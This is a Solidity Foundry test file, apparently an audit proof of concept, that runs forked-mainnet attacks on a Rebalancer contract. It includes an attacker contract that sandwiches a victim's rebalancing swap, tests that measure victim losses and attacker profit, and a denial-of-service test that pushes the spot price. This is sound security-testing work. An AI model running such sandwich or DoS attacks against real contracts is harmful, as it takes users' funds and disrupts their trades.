// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Rebalancer} from "src/Rebalancer.sol";

interface ISwapRouter02 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata p) external payable returns (uint256);
}

/// @dev Attacker: all in one transaction (front-run, execute, back-run). No nesting, so nonReentrant is no help.
contract Sandwicher {
    IERC20 constant EURC = IERC20(0x60a3E35Cc302bFA44Cb288Bc5a4F316Fdb1adb42);
    IERC20 constant USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    ISwapRouter02 constant ROUTER = ISwapRouter02(0x2626664c2603336E57B271c5C0b26F421741e481);

    function attack(Rebalancer r, address victim, uint256 pushEurc) external {
        EURC.approve(address(ROUTER), type(uint256).max);
        USDC.approve(address(ROUTER), type(uint256).max);
        // 1. front-run: sell EURC for USDC -> EURC cheaper -> cbBTC more expensive in EURC (spot up)
        if (pushEurc > 0) ROUTER.exactInputSingle(ISwapRouter02.ExactInputSingleParams(address(EURC), address(USDC), 500, address(this), pushEurc, 0, 0));
        // 2. the victim's run (buy: EURC -> USDC -> cbBTC) pushes EURC down even further
        r.execute(victim, address(this));
        // 3. back-run: buy EURC back with all USDC
        if (pushEurc > 0) ROUTER.exactInputSingle(ISwapRouter02.ExactInputSingleParams(address(USDC), address(EURC), 500, address(this), USDC.balanceOf(address(this)), 0, 0));
    }

    /// @dev Sell direction: buy EURC with USDC (EURC more expensive -> cbBTC cheaper in EURC, spot down),
    ///      let the victim sell cbBTC -> USDC -> EURC (pushes EURC further up), sell the EURC back.
    function attackSell(Rebalancer r, address victim, uint256 pushUsdc) external {
        EURC.approve(address(ROUTER), type(uint256).max);
        USDC.approve(address(ROUTER), type(uint256).max);
        if (pushUsdc > 0) ROUTER.exactInputSingle(ISwapRouter02.ExactInputSingleParams(address(USDC), address(EURC), 500, address(this), pushUsdc, 0, 0));
        r.execute(victim, address(this));
        if (pushUsdc > 0) ROUTER.exactInputSingle(ISwapRouter02.ExactInputSingleParams(address(EURC), address(USDC), 500, address(this), EURC.balanceOf(address(this)), 0, 0));
    }

    function pushUsdcOnly(uint256 pushUsdc) external {
        USDC.approve(address(ROUTER), type(uint256).max);
        ROUTER.exactInputSingle(ISwapRouter02.ExactInputSingleParams(address(USDC), address(EURC), 500, address(this), pushUsdc, 0, 0));
    }

    function pushOnly(uint256 pushEurc) external {
        EURC.approve(address(ROUTER), type(uint256).max);
        ROUTER.exactInputSingle(ISwapRouter02.ExactInputSingleParams(address(EURC), address(USDC), 500, address(this), pushEurc, 0, 0));
    }
}

contract OracleSandwichTest is Test {
    IERC20 internal constant EURC = IERC20(0x60a3E35Cc302bFA44Cb288Bc5a4F316Fdb1adb42);
    IERC20 internal constant CBBTC = IERC20(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);
    IERC20 internal constant USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    address internal constant ROUTER = 0x2626664c2603336E57B271c5C0b26F421741e481;
    address internal constant FEED_CBBTC_USD = 0x07DA0E54543a844a80ABE69c8A12F22B3aA59f9D;
    address internal constant FEED_EURC_USD = 0xDAe398520e2B67cd3f27aeF9Cf14D93D927f8250;
    address internal constant SEQUENCER = 0xBCF85224fc0756B9Fa45aA7892530B47e10b6433;
    address internal constant POOL_EURC_USDC = 0x7279c08A36333e12c3Fc81747963264c100D66fB;
    address internal constant POOL_USDC_CBBTC = 0xfBB6Eed8e7aa03B138556eeDaF5D271A5E1e43ef;

    address internal treasury = makeAddr("treasury");
    address internal forwarder = makeAddr("forwarder");
    address internal victim = makeAddr("victim");
    Rebalancer internal r;
    Sandwicher internal atk;

    function setUp() public {
        vm.createSelectFork(vm.envOr("BASE_RPC_URL", string("https://mainnet.base.org")));
        vm.etch(forwarder, hex"5f");
        r = new Rebalancer(Rebalancer.Deployment({
            eurc: address(EURC), cbbtc: address(CBBTC), usdc: address(USDC), router: ROUTER,
            feedCbbtcUsd: FEED_CBBTC_USD, feedEurcUsd: FEED_EURC_USD, sequencerFeed: SEQUENCER,
            poolEurcUsdc: POOL_EURC_USDC, poolUsdcCbbtc: POOL_USDC_CBBTC,
            treasury: treasury, forwarder: forwarder, workflowOwner: makeAddr("wf")
        }));
        atk = new Sandwicher();
    }

    function _fundVictim(uint256 eurcAmount, uint16 slippageBps) internal {
        deal(address(EURC), victim, eurcAmount);
        vm.startPrank(victim);
        EURC.approve(address(r), type(uint256).max);
        CBBTC.approve(address(r), type(uint256).max);
        // maxCorrection 100% -> run = drift * total = 80% of the EURC balance
        r.setParams(Rebalancer.Params({active: true, targetBps: 8000, bandBps: 500, maxCorrectionBps: 10000, minTradeEurc: 5e6, interval: 1 days, maxSlippageBps: slippageBps}));
        vm.stopPrank();
    }

    /// @dev Largest push (EURC sold into the EURC/USDC pool) at which quoteChecked still succeeds.
    function _maxPushWithinDeviation() internal returns (uint256 push) {
        uint256 lo = 0; uint256 hi = 200_000e6;
        deal(address(EURC), address(this), hi);
        for (uint256 i = 0; i < 40; i++) {
            uint256 mid = (lo + hi) / 2;
            uint256 snap = vm.snapshotState();
            EURC.transfer(address(atk), mid);
            atk.pushOnly(mid);
            (bool ok,) = address(r).staticcall(abi.encodeWithSelector(r.quoteChecked.selector));
            vm.revertToState(snap);
            if (ok) lo = mid; else hi = mid;
        }
        push = lo;
    }

    function _run(uint256 victimEurc, uint16 slippageBps, uint256 push) internal returns (bool ok, int256 attackerPnl, uint256 victimBtc) {
        _fundVictim(victimEurc, slippageBps);
        deal(address(EURC), address(atk), push);
        uint256 before = EURC.balanceOf(address(atk));
        try atk.attack(r, victim, push) {
            ok = true;
        } catch (bytes memory reason) {
            ok = false;
            console.log("attack reverted:", string(reason));
        }
        attackerPnl = int256(EURC.balanceOf(address(atk))) - int256(before);
        victimBtc = CBBTC.balanceOf(victim);
    }

    function test_poc_selfSandwich_10k_slippage100() public {
        uint256 oracle = r.quote();
        uint256 spot0 = r.spot();
        console.log("oracle EURC/cbBTC:", oracle, " spot:", spot0);
        uint256 push = _maxPushWithinDeviation();
        console.log("max push within 50 bps (EURC):", push);

        // baseline without manipulation
        uint256 snap = vm.snapshotState();
        (, , uint256 fairBtc) = _run(12_500e6, 100, 0);
        vm.revertToState(snap);
        console.log("victim cbBTC without attack:", fairBtc);

        (bool ok, int256 pnl, uint256 btc) = _run(12_500e6, 100, push);
        console.log("attack succeeded:", ok);
        console.log("attacker PnL (EURC 6 dec):"); console.logInt(pnl);
        console.log("victim cbBTC with attack:", btc);
        uint256 lossBtc = fairBtc - btc;
        console.log("victim loss (cbBTC 8 dec):", lossBtc, " in EURC:", lossBtc * oracle / 1e8);
        console.log("reward received by attacker (EURC):", uint256(50_000));
        assertTrue(ok);
        assertGt(pnl, 0, "attacker earns nothing");
    }

    function test_poc_selfSandwich_10k_slippage30() public {
        uint256 push = _maxPushWithinDeviation();
        (bool ok, int256 pnl, ) = _run(12_500e6, 30, push);
        console.log("slippage 30 bps: attack succeeded:", ok); console.logInt(pnl);
    }

    function test_poc_selfSandwich_1k_slippage100() public {
        uint256 push = _maxPushWithinDeviation();
        uint256 snap = vm.snapshotState();
        (, , uint256 fairBtc) = _run(1_250e6, 100, 0);
        vm.revertToState(snap);
        (bool ok, int256 pnl, uint256 btc) = _run(1_250e6, 100, push);
        console.log("run 1k: succeeded:", ok); console.logInt(pnl);
        console.log("run 1k: victim loss cbBTC:", fairBtc - btc);
    }

    /// @dev DoS: a push > 50 bps leaves isDue/dueOwners empty and makes execute revert; what does it cost the attacker?
    function test_poc_dosBySpotPush() public {
        _fundVictim(1_250e6, 100);
        (bool due,) = r.isDue(victim);
        assertTrue(due);
        uint256 push = _maxPushWithinDeviation() + 1_000e6;
        deal(address(EURC), address(atk), push);
        atk.pushOnly(push);
        (due,) = r.isDue(victim);
        assertFalse(due, "isDue still true");
        assertEq(r.dueOwners(0, 10).length, 0);
        vm.expectRevert();
        r.execute(victim, address(this));
        console.log("DoS-push (EURC):", push, " USDC received:", USDC.balanceOf(address(atk)));
    }

    /// @dev Sweep: run size x push size, slippage 100 bps. Prints attacker PnL and victim loss.
    function test_poc_sweep() public {
        uint256 oracle = r.quote();
        uint256 maxPush = _maxPushWithinDeviation();
        console.log("oracle:", oracle, " spot:", r.spot());
        console.log("maxPush within 50 bps:", maxPush);
        uint256[4] memory runs = [uint256(1_250e6), 3_125e6, 6_250e6, 12_500e6];
        for (uint256 k = 0; k < runs.length; k++) {
            uint256 snap0 = vm.snapshotState();
            (bool okBase, , uint256 fairBtc) = _run(runs[k], 100, 0);
            vm.revertToState(snap0);
            console.log("---- run EURC:", runs[k] * 8 / 10, " baseline ok:", okBase);
            console.log("     baseline cbBTC:", fairBtc, " fair@oracle:", (runs[k] * 8 / 10) * 9975 / 10000 * 1e8 / oracle);
            for (uint256 f = 1; f <= 5; f++) {
                uint256 push = maxPush * f / 5;
                uint256 snap = vm.snapshotState();
                (bool ok, int256 pnl, uint256 btc) = _run(runs[k], 100, push);
                if (ok) {
                    console.log("     push:", push, " victim cbBTC:", btc);
                    console.log("       victim loss (cbBTC):", fairBtc > btc ? fairBtc - btc : 0, " in EURC:", (fairBtc > btc ? fairBtc - btc : 0) * oracle / 1e8);
                    console.log("       attacker PnL (EURC):"); console.logInt(pnl);
                } else {
                    console.log("     push:", push, " -> execute fails");
                }
                vm.revertToState(snap);
            }
        }
    }

    function _maxUsdcPushWithinDeviation() internal returns (uint256 push) {
        uint256 lo = 0; uint256 hi = 200_000e6;
        for (uint256 i = 0; i < 40; i++) {
            uint256 mid = (lo + hi) / 2;
            uint256 snap = vm.snapshotState();
            deal(address(USDC), address(atk), mid);
            atk.pushUsdcOnly(mid);
            (bool ok,) = address(r).staticcall(abi.encodeWithSelector(r.quoteChecked.selector));
            vm.revertToState(snap);
            if (ok) lo = mid; else hi = mid;
        }
        push = lo;
    }

    /// @dev Sell run: victim holds only cbBTC, maxCorrection 100% -> sells 20% of the value.
    function test_poc_sweepSell() public {
        uint256 oracle = r.quote();
        uint256 maxPush = _maxUsdcPushWithinDeviation();
        console.log("maxPush USDC within 50 bps:", maxPush);
        uint256[3] memory btcs = [uint256(7_500_000), 18_750_000, 37_500_000]; // ~5k, 12.5k, 25k EURC value -> run 1k, 2.5k, 5k
        for (uint256 k = 0; k < btcs.length; k++) {
            deal(address(CBBTC), victim, btcs[k]);
            vm.startPrank(victim);
            CBBTC.approve(address(r), type(uint256).max);
            r.setParams(Rebalancer.Params({active: true, targetBps: 8000, bandBps: 500, maxCorrectionBps: 10000, minTradeEurc: 5e6, interval: 1 days, maxSlippageBps: 100}));
            vm.stopPrank();
            uint256 snap0 = vm.snapshotState();
            vm.prank(address(atk)); r.execute(victim, address(atk));
            uint256 fairEurc = EURC.balanceOf(victim);
            vm.revertToState(snap0);
            console.log("---- sell run, EURC value of position:", btcs[k] * oracle / 1e8, " baseline EURC received:", fairEurc);
            for (uint256 f = 1; f <= 5; f++) {
                uint256 push = maxPush * f / 5;
                uint256 snap = vm.snapshotState();
                deal(address(USDC), address(atk), push);
                uint256 usdcBefore = USDC.balanceOf(address(atk));
                try atk.attackSell(r, victim, push) {
                    int256 pnl = int256(USDC.balanceOf(address(atk))) - int256(usdcBefore);
                    console.log("     push USDC:", push, " victim loss EURC:", fairEurc - EURC.balanceOf(victim));
                    console.log("       attacker PnL (USDC):"); console.logInt(pnl);
                } catch { console.log("     push USDC:", push, " -> execute fails"); }
                vm.revertToState(snap);
            }
            deal(address(CBBTC), victim, 0);
            vm.warp(block.timestamp); // no effect, readability
        }
    }
}
